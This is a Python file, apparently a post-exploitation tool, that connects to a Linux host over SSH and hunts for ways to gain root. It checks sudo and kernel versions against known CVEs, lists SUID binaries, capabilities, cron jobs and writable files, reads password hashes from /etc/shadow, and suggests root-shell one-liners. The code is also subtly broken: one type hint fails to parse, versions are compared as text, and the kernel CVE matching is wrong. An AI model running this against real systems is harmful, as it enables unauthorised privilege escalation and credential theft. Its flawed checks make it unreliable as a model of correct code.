import re
import os
from typing import List, Dict, Optional, Tuple
from paramiko import SSHClient

class PrivilegeEscalation:
    """Privilege escalation techniques for Linux systems"""
    
    def __init__(self, ssh_client: SSHClient):
        self.ssh = ssh_client
        self.sudo_version = None
        self.kernel_version = None
        self.suid_binaries = None
        self.capabilities = None
        
    def execute(self, command: str) -> Optional[str]:
        """Execute command and return output"""
        try:
            _, stdout, stderr = self.ssh.exec_command(command)
            return stdout.read().decode().strip()
        except Exception:
            return None
    
    def check_sudo_version(self) -> Optional[Tuple[str, List[str]]:
        """Check sudo version for known vulnerabilities"""
        version_output = self.execute('sudo --version')
        if not version_output:
            return None
            
        version_match = re.search(r'Sudo version (\d+\.\d+\.\d+)', version_output)
        if not version_match:
            return None
            
        self.sudo_version = version_match.group(1)
        vulns = []
        
        # Check for specific vulnerabilities
        if self.sudo_version <= '1.8.28':
            vulns.append("CVE-2019-14287: Sudo <=1.8.28 - Bypass RunAs user restrictions")
        if self.sudo_version <= '1.8.26':
            vulns.append("CVE-2019-18634: Sudo <=1.8.26 - pwfeedback buffer overflow")
            
        return (self.sudo_version, vulns)
    
    def check_kernel_version(self) -> Optional[Tuple[str, List[str]]]:
        """Check kernel version for known vulnerabilities"""
        kernel_output = self.execute('uname -r')
        if not kernel_output:
            return None
            
        self.kernel_version = kernel_output.strip()
        vulns = []
        
        # Check for common kernel exploits
        if "4.10" in self.kernel_version:
            vulns.append("DirtyCow (CVE-2016-5195)")
        if "5.8" in self.kernel_version:
            vulns.append("DirtyPipe (CVE-2022-0847)")
            
        return (self.kernel_version, vulns)
    
    def find_suid_binaries(self) -> Optional[List[str]]:
        """Find SUID binaries that may be exploitable"""
        suid_output = self.execute('find / -perm -4000 -type f 2>/dev/null')
        if not suid_output:
            return None
            
        binaries = suid_output.split('\n')
        self.suid_binaries = [b for b in binaries if b]
        
        # Check for known problematic binaries
        interesting_binaries = []
        for binary in self.suid_binaries:
            name = os.path.basename(binary)
            if name in ['nmap', 'vim', 'find', 'bash', 'less', 'more', 'cp']:
                interesting_binaries.append(binary)
                
        return interesting_binaries
    
    def check_capabilities(self) -> Optional[List[str]]:
        """Check binaries with dangerous capabilities"""
        caps_output = self.execute('getcap -r / 2>/dev/null')
        if not caps_output:
            return None
            
        self.capabilities = caps_output.split('\n')
        dangerous = []
        
        for line in self.capabilities:
            if 'cap_dac_read_search' in line or 'cap_setuid' in line:
                dangerous.append(line)
                
        return dangerous
    
    def check_cron_jobs(self) -> Optional[List[str]]:
        """Check for writable cron jobs"""
        cron_output = self.execute('ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null')
        if not cron_output:
            return None
            
        # Check for world-writable cron files
        writable = []
        for line in cron_output.split('\n'):
            if 'rw-' in line or 'rwx' in line:
                writable.append(line)
                
        return writable
    
    def check_writable_files(self) -> Optional[List[str]]:
        """Check for writable system files"""
        files_output = self.execute('find / -writable -type f 2>/dev/null | grep -v "/proc/"')
        if not files_output:
            return None
            
        interesting_files = []
        for f in files_output.split('\n'):
            if any(x in f for x in ['/etc/', '/usr/', '/var/', '/bin/', '/sbin/']):
                interesting_files.append(f)
                
        return interesting_files
    
    def check_password_hashes(self) -> Optional[Dict[str, str]]:
        """Check for password hashes in /etc/shadow"""
        shadow_output = self.execute('cat /etc/shadow 2>/dev/null')
        if not shadow_output:
            return None
            
        hashes = {}
        for line in shadow_output.split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) > 1 and parts[1] not in ['*', '!', '!!']:
                    hashes[parts[0]] = parts[1]
                    
        return hashes if hashes else None
    
    def run_all_checks(self) -> Dict:
        """Run all privilege escalation checks"""
        results = {
            'sudo_version': self.check_sudo_version(),
            'kernel_version': self.check_kernel_version(),
            'suid_binaries': self.find_suid_binaries(),
            'capabilities': self.check_capabilities(),
            'cron_jobs': self.check_cron_jobs(),
            'writable_files': self.check_writable_files(),
            'password_hashes': self.check_password_hashes(),
        }
        return {k:v for k,v in results.items() if v}
    
    def suggest_exploits(self, results: Dict) -> List[str]:
        """Suggest possible exploits based on findings"""
        suggestions = []
        
        # Check sudo version vulnerabilities
        if 'sudo_version' in results:
            version, vulns = results['sudo_version']
            suggestions.extend(vulns)
            
        # Check kernel vulnerabilities
        if 'kernel_version' in results:
            version, vulns = results['kernel_version']
            suggestions.extend(vulns)
            
        # Check SUID binaries
        if 'suid_binaries' in results:
            for binary in results['suid_binaries']:
                name = os.path.basename(binary)
                if name == 'find':
                    suggestions.append("SUID find - try 'find / -exec /bin/sh \; -quit'")
                elif name == 'bash':
                    suggestions.append("SUID bash - try 'bash -p'")
                    
        # Check capabilities
        if 'capabilities' in results:
            for line in results['capabilities']:
                if 'cap_setuid' in line:
                    suggestions.append(f"Capability setuid: {line}")
                    
        return suggestions